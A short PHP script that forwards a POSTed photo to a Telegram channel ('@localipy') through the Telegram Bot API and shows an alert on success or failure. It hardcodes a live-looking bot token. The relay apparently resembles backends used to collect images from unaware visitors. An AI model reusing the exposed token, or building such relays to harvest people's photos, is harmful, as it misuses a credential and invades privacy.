<?php
		// Set up the Telegram bot API credentials
		$bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
		$telegram_api_url = 'https://api.telegram.org/bot' . $bot_token . '/sendPhoto';

		// Check if a photo was sent via POST
		if(isset($_POST['photo'])) {
			$photo = $_POST['photo'];
			// Send the photo to the Telegram channel
			$post_fields = array(
				'chat_id' => '@localipy',
				'photo' => $photo
			);
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$response = curl_exec($ch);
			curl_close($ch);
			if($response) {
				echo '<script>alert("Photo sent to Telegram channel!");</script>';
			} else {
				echo '<script>alert("Error sending photo!");</script>';
			}
		}
	?>
